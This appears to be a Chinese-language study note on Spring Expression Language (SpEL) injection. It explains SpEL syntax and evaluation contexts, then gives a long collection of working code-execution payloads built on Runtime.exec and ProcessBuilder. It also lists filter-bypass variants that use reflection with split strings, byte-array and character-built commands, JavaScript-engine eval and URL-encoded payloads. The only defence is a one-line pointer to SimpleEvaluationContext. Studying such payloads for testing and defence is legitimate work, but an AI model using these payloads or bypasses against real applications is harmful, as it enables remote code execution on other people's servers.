# SpEL表达式注入

## 前言

具体参考https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93



## 定界符

SpEL使用`#{}`作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。

- `#{}`就是SpEL的定界符，用于指明内容未SpEL表达式并执行；
- `${}`主要用于加载外部属性文件中的值；
- 两者可以混合使用，但是必须`#{}`在外面，`${}`在里面，如`#{'${}'}`，注意单引号是字符串类型才添加的；

## T表达式

在SpEL表达式中，使用`T(Type)`运算符会调用类的作用域和方法。

使用`T(Type)`来表示java.lang.Class实例，Type必须是类全限定名，但”java.lang”包除外，因为SpEL已经内置了该包，即该包下的类可以不指定具体的包名；使用类类型表达式还可以进行访问类静态方法和类静态字段。

```java
T(Runtime).getRuntime().exec('calc')
```



## Expression用法

SpEL的用法有三种形式，一种是在注解@Value中；一种是XML配置；最后一种是在代码块中使用Expression。

> SpEL 在求表达式值时一般分为四步，其中第三步可选：首先构造一个解析器，其次解析器解析字符串表达式，在此构造上下文，最后根据上下文得到表达式运算后的值。

简单例子：

```java
        ExpressionParser parser = new SpelExpressionParser();
        String poc = "T(Runtime).getRuntime().exec('calc')";
        EvaluationContext context = new StandardEvaluationContext();
        parser.parseExpression(poc).getValue(context);
```

### 类实例化

类实例化同样使用Java关键字new，类名必须是全限定名，但java.lang包内的类型除外。

```java
String poc = "new java.util.Date()"
```

## 变量定义和引用

在SpEL表达式中，变量定义通过EvaluationContext类的setVariable(variableName, value)函数来实现；在表达式中使用”#variableName”来引用；除了引用自定义变量，SpEL还允许引用根对象及当前上下文对象：

- `#this`：使用当前正在计算的上下文；
- `#root`：引用容器的root对象；

## SpEL表达式注入漏洞

SimpleEvaluationContext和StandardEvaluationContext是SpEL提供的两个EvaluationContext：

- SimpleEvaluationContext - 针对不需要SpEL语言语法的全部范围并且应该受到有意限制的表达式类别，公开SpEL语言特性和配置选项的子集。
- StandardEvaluationContext - 公开全套SpEL语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。

SimpleEvaluationContext旨在仅支持SpEL语言语法的一个子集，不包括 Java类型引用、构造函数和bean引用；而StandardEvaluationContext是支持全部SpEL语法的。

默认使用`StandardEvaluationContext `

```java
        ExpressionParser parser = new SpelExpressionParser();
        String poc = "T(Runtime).getRuntime().exec('calc')";
        EvaluationContext context = new StandardEvaluationContext();
        parser.parseExpression(poc).getValue(context);
```

一些POC：

```java
// PoC原型

// Runtime
T(java.lang.Runtime).getRuntime().exec("calc")
T(Runtime).getRuntime().exec("calc")

// ProcessBuilder
new java.lang.ProcessBuilder({'calc'}).start()
new ProcessBuilder({'calc'}).start()

******************************************************************************
// Bypass技巧

// 反射调用
T(String).getClass().forName("java.lang.Runtime").getRuntime().exec("calc")

// 同上，需要有上下文环境
#this.getClass().forName("java.lang.Runtime").getRuntime().exec("calc")

// 反射调用+字符串拼接，绕过如javacon题目中的正则过滤
T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})

// 同上，需要有上下文环境
#this.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})

// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1
// byte数组内容的生成后面有脚本
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()

// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2
// byte数组内容的生成后面有脚本
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))

// JavaScript引擎通用PoC
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")

T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)

// JavaScript引擎+反射调用
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)

// JavaScript引擎+URL编码
// 其中URL编码内容为：
// 不加最后的getInputStream()也行，因为弹计算器不需要回显
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)

// 黑名单过滤".getClass("，可利用数组的方式绕过，还未测试成功
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')

// JDK9新增的shell，还未测试
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```

## 防御

使用`SimpleEvaluationContext`。



